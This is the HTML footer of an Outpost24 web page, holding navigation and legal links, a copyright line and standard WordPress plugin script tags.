</div><div id="nav_menu-3" class="widget widget_nav_menu"><div class="menu-footer-2-container"><ul id="menu-footer-2" class="menu"><li id="menu-item-2584" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2584"><a href="https://outpost24.com/company/" aria-label="menu link to Our Company">Our Company</a></li>
<li id="menu-item-2585" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2585"><a href="/customers/" aria-label="menu link to Customers">Customers</a></li>
<li id="menu-item-2586" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2586"><a href="https://outpost24.com/partners/" aria-label="menu link to Partners">Partners</a></li>
<li id="menu-item-2587" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2587"><a href="https://outpost24.com/certifications/" aria-label="menu link to Certifications">Certifications</a></li>
<li id="menu-item-2588" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2588"><a href="https://careers.outpost24.com/" aria-label="menu link to Careers">Careers</a></li>
</ul></div></div>		</div>
		<div class="footer-widget-three">
		  <div id="block-9" class="widget widget_block">
<h4 class="wp-block-heading has-white-color has-text-color">LEGAL</h4>
</div><div id="nav_menu-4" class="widget widget_nav_menu"><div class="menu-footer-3-container"><ul id="menu-footer-3" class="menu"><li id="menu-item-4904" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4904"><a href="https://outpost24.com/legal/" aria-label="menu link to Legal Information">Legal Information</a></li>
<li id="menu-item-1349" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1349"><a href="https://outpost24.com/legal/website-terms-of-use/" aria-label="menu link to Website Terms of Use">Website Terms of Use</a></li>
<li id="menu-item-4909" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4909"><a href="https://outpost24.com/policies/" aria-label="menu link to Security and Policies">Security and Policies</a></li>
<li id="menu-item-1351" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1351"><a href="https://outpost24.com/policies/privacy-policy/" aria-label="menu link to Privacy Statement">Privacy Statement</a></li>
</ul></div></div>		</div>
      </div>
    </div>
	<div class="copyright-container">
	  <div class="container">
	    <span class="copyright">© Outpost24 All rights reserved.</span>
	  </div>
    </div>
</footer>

<style id='core-block-supports-inline-css' type='text/css'>
.wp-container-core-buttons-is-layout-1{justify-content:center;}.wp-container-core-buttons-is-layout-2{justify-content:center;}.wp-container-core-columns-is-layout-1{flex-wrap:nowrap;}
</style>
<script type="text/javascript" src="https://outpost24.com/wp-content/plugins/modal-block/dist/modal.js?ver=1683665261" id="bod-modal-block-js-js"></script>
<script type="text/javascript" id="jquery-lazyloadxt-js-extra">
/* <![CDATA[ */
var a3_lazyload_params = {"apply_images":"1","apply_videos":"1"};
/* ]]> */
</script>
<script type="text/javascript" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/js/jquery.lazyloadxt.extra.min.js?ver=2.7.3" id="jquery-lazyloadxt-js"></script>
<script type="text/javascript" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/js/jquery.lazyloadxt.srcset.min.js?ver=2.7.3" id="jquery-lazyloadxt-srcset-js"></script>
<script type="text/javascript" id="jquery-lazyloadxt-extend-js-extra">
/* <![CDATA[ */
var a3_lazyload_extend_params = {"edgeY":"0","horizontal_container_classnames":""};
/* ]]> */
</script>
<script type="text/javascript" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/js/jquery.lazyloadxt.extend.js?ver=2.7.3" id="jquery-lazyloadxt-extend-js"></script>
<script type="text/javascript" src="https://outpost24.com/wp-includes/js/hoverIntent.min.js?ver=1.10.2" id="hoverIntent-js"></script>
<script type="text/javascript" src="https://outpost24.com/wp-content/plugins/megamenu/js/maxmegamenu.js?ver=3.4.1" id="megamenu-js"></script>
<script type="text/javascript" src="https://outpost24.com/wp-content/plugins/code-block-pro/build/front/front.js?ver=9e61187462c44495f394" id="kevinbatdorf-code-block-pro-view-script-js" data-wp-strategy="defer"></script>
<script type="text/javascript" id="kevinbatdorf-code-block-pro-view-script-js-after">
/* <![CDATA[ */
window.codeBlockPro = {"pluginUrl":"https:\/\/outpost24.com\/wp-content\/plugins\/code-block-pro\/"};
/* ]]> */
</script>
</body>
</html>
